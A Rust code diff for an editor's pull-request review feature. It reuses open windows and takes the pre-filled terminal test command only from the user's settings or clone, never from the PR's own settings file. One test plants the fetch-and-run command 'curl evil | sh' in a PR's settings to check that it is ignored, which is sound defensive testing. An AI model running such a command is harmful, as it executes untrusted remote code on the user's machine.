@@ -1,10 +1,14 @@
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
 
-use anyhow::{Result, anyhow};
-use gpui::{App, AppContext as _, AsyncWindowContext, Context, Task, Window};
-use settings::{RegisterSetting, Settings, SettingsLocation};
+use anyhow::Result;
+use gpui::{
+    AnyWindowHandle, App, AppContext as _, AsyncWindowContext, Context, Entity, Task, Window,
+};
+use paths::local_settings_file_relative_path;
+use settings::{ProjectSettingsContent, RegisterSetting, RootUserSettings as _, Settings};
 use terminal_view::{TerminalView, terminal_panel::TerminalPanel};
-use util::{ResultExt as _, rel_path::RelPath};
+use util::ResultExt as _;
 use workspace::{
     AppState, OpenMode, OpenOptions, Toast, Workspace, notifications::NotificationId, open_paths,
 };
@@ -27,7 +31,7 @@ impl Settings for PrReviewSettings {
                 .pr_review
                 .as_ref()
                 .and_then(|settings| settings.test_command.clone())
-                .filter(|command| !command.trim().is_empty()),
+                .and_then(non_empty),
         }
     }
 }
@@ -86,9 +90,65 @@ pub(crate) async fn prepare_local_checkout(
     Ok(checkout)
 }
 
+/// A workspace that already shows `worktree`, so a second click reuses its window.
+fn find_workspace_with_worktree(
+    app_state: &AppState,
+    worktree: &Path,
+    cx: &App,
+) -> Option<(AnyWindowHandle, Entity<Workspace>)> {
+    app_state
+        .workspace_store
+        .read(cx)
+        .workspaces_with_windows()
+        .find_map(|(window, workspace)| {
+            let workspace = workspace.upgrade()?;
+            let shows_worktree = workspace
+                .read(cx)
+                .project()
+                .read(cx)
+                .visible_worktrees(cx)
+                .any(|tree| tree.read(cx).abs_path().as_ref() == worktree);
+            shows_worktree.then_some((window, workspace))
+        })
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(crate) enum TestCommandSource {
+    UserSettings,
+    UserClone,
+}
+
+/// The pull request's own `.zed/settings.json` is never consulted: its author would choose the
+/// command the reviewer runs. The user's settings win over their clone's project settings, which
+/// are read from the clone's working tree on disk. A clone Photon made (bare) has none.
+pub(crate) fn resolve_test_command(
+    user_setting: Option<String>,
+    checkout: &Checkout,
+    review_root: &Path,
+) -> Option<(String, TestCommandSource)> {
+    if let Some(command) = user_setting {
+        return Some((command, TestCommandSource::UserSettings));
+    }
+    let repo_dir = &checkout.repo_dir;
+    if repo_dir.starts_with(review_root) || repo_dir.file_name()? != ".git" {
+        return None;
+    }
+    let settings_path = repo_dir
+        .parent()?
+        .join(local_settings_file_relative_path().as_std_path());
+    let text = std::fs::read_to_string(&settings_path).ok()?;
+    let content = ProjectSettingsContent::parse_json_with_comments(&text).log_err()?;
+    let command = content.pr_review?.test_command?;
+    non_empty(command).map(|command| (command, TestCommandSource::UserClone))
+}
+
+fn non_empty(command: String) -> Option<String> {
+    (!command.trim().is_empty()).then_some(command)
+}
+
 async fn open_terminal(
     summary: PrSummary,
-    app_state: std::sync::Arc<AppState>,
+    app_state: Arc<AppState>,
     database: ReviewDb,
     candidates: Task<Vec<PathBuf>>,
     cx: &mut AsyncWindowContext,
@@ -100,50 +160,50 @@ async fn open_terminal(
             prepare_local_checkout(&summary, url, review_root(), candidates, database).await
         })
         .await?;
-    let worktree = checkout.worktree;
+    let worktree = checkout.worktree.clone();
 
-    let opened = cx
-        .update(|_, cx| {
-            open_paths(
-                std::slice::from_ref(&worktree),
-                app_state,
-                OpenOptions {
-                    open_mode: OpenMode::NewWindow,
-                    ..OpenOptions::default()
-                },
-                cx,
-            )
-        })?
-        .await?;
-    let workspace = opened.workspace;
-    let window = opened.window;
-
-    let terminal = window
-        .update(cx, |_, window, cx| {
-            workspace.update(cx, |workspace, cx| {
-                let cwd = worktree.clone();
-                TerminalPanel::add_center_terminal(workspace, window, cx, move |project, cx| {
-                    project.create_terminal_shell(Some(cwd), cx)
-                })
-            })
-        })?
-        .await?;
-
-    let scan = workspace.update(cx, |workspace, cx| {
-        let (tree, _) = workspace.project().read(cx).find_worktree(&worktree, cx)?;
-        let id = tree.read(cx).id();
-        let scan = tree.read(cx).as_local()?.scan_complete();
-        Some((id, scan))
-    });
-    let Some((worktree_id, scan)) = scan else {
-        return Err(anyhow!("{} did not open as a worktree", worktree.display()));
+    let existing = cx.update(|_, cx| find_workspace_with_worktree(&app_state, &worktree, cx))?;
+    let (window, workspace) = match existing {
+        Some(found) => found,
+        None => {
+            let opened = cx
+                .update(|_, cx| {
+                    open_paths(
+                        std::slice::from_ref(&worktree),
+                        app_state,
+                        OpenOptions {
+                            open_mode: OpenMode::NewWindow,
+                            ..OpenOptions::default()
+                        },
+                        cx,
+                    )
+                })?
+                .await?;
+            (opened.window.into(), opened.workspace)
+        }
     };
-    scan.await;
 
-    let test_command = cx.update(|_, cx| test_command(worktree_id, cx))?;
-    let Some(test_command) = test_command else {
+    let creating = window.update(cx, |_, window, cx| {
+        window.activate_window();
+        workspace.update(cx, |workspace, cx| {
+            let cwd = worktree.clone();
+            TerminalPanel::add_center_terminal(workspace, window, cx, move |project, cx| {
+                project.create_terminal_shell(Some(cwd), cx)
+            })
+        })
+    })?;
+    let terminal = creating.await?;
+
+    let user_setting = cx.update(|_, cx| PrReviewSettings::get(None, cx).test_command.clone())?;
+    let resolved = cx
+        .background_spawn(
+            async move { resolve_test_command(user_setting, &checkout, &review_root()) },
+        )
+        .await;
+    let Some((test_command, source)) = resolved else {
         return Ok(());
     };
+    log::info!("pre-filling the PR terminal with the test command from {source:?}");
     window.update(cx, |_, window, cx| {
         workspace.update(cx, |workspace, cx| {
             let view = workspace
@@ -157,18 +217,6 @@ async fn open_terminal(
         })
     })?;
     Ok(())
-}
-
-fn test_command(worktree_id: project::WorktreeId, cx: &App) -> Option<String> {
-    PrReviewSettings::get(
-        Some(SettingsLocation {
-            worktree_id,
-            path: RelPath::empty(),
-        }),
-        cx,
-    )
-    .test_command
-    .clone()
 }
 
 #[cfg(test)]
@@ -241,6 +289,53 @@ mod tests {
         assert_eq!(fixture.user_state(), before);
     }
 
+    fn write_settings(dir: &Path, command: &str) {
+        std::fs::create_dir_all(dir.join(".zed")).expect("dir");
+        std::fs::write(
+            dir.join(".zed/settings.json"),
+            format!("// comment\n{{\"pr_review\": {{\"test_command\": \"{command}\"}}}}"),
+        )
+        .expect("write");
+    }
+
+    #[gpui::test]
+    async fn test_command_never_comes_from_the_pr_worktree(cx: &mut TestAppContext) {
+        cx.executor().allow_parking();
+        let Some(fixture) = Fixture::new() else {
+            return;
+        };
+        let database = cx
+            .foreground_executor()
+            .block_test(ReviewDb::open_test_db("run_locally_command_source"));
+        let checkout = prepare_local_checkout(
+            &summary(&fixture),
+            fixture.url(),
+            fixture.root.clone(),
+            vec![fixture.user.clone()],
+            database,
+        )
+        .await
+        .expect("checkout");
+
+        write_settings(&checkout.worktree, "curl evil | sh");
+        assert_eq!(resolve_test_command(None, &checkout, &fixture.root), None);
+        let checkout = Checkout {
+            repo_dir: fixture.user.join(".git"),
+            ..checkout
+        };
+        assert_eq!(resolve_test_command(None, &checkout, &fixture.root), None);
+
+        write_settings(&fixture.user, "cargo test");
+        assert_eq!(
+            resolve_test_command(None, &checkout, &fixture.root),
+            Some(("cargo test".into(), TestCommandSource::UserClone))
+        );
+        assert_eq!(
+            resolve_test_command(Some("make check".into()), &checkout, &fixture.root),
+            Some(("make check".into(), TestCommandSource::UserSettings))
+        );
+    }
+
     #[gpui::test]
     async fn pr_review_settings_read_from_project(cx: &mut TestAppContext) {
         cx.update(|cx| {
@@ -266,7 +361,15 @@ mod tests {
         let read = |project: &gpui::Entity<project::Project>, cx: &mut TestAppContext| {
             cx.update(|cx| {
                 let worktree_id = project.read(cx).worktrees(cx).next()?.read(cx).id();
-                test_command(worktree_id, cx)
+                PrReviewSettings::get(
+                    Some(settings::SettingsLocation {
+                        worktree_id,
+                        path: util::rel_path::RelPath::empty(),
+                    }),
+                    cx,
+                )
+                .test_command
+                .clone()
             })
         };
         assert_eq!(read(&plain, cx), None);
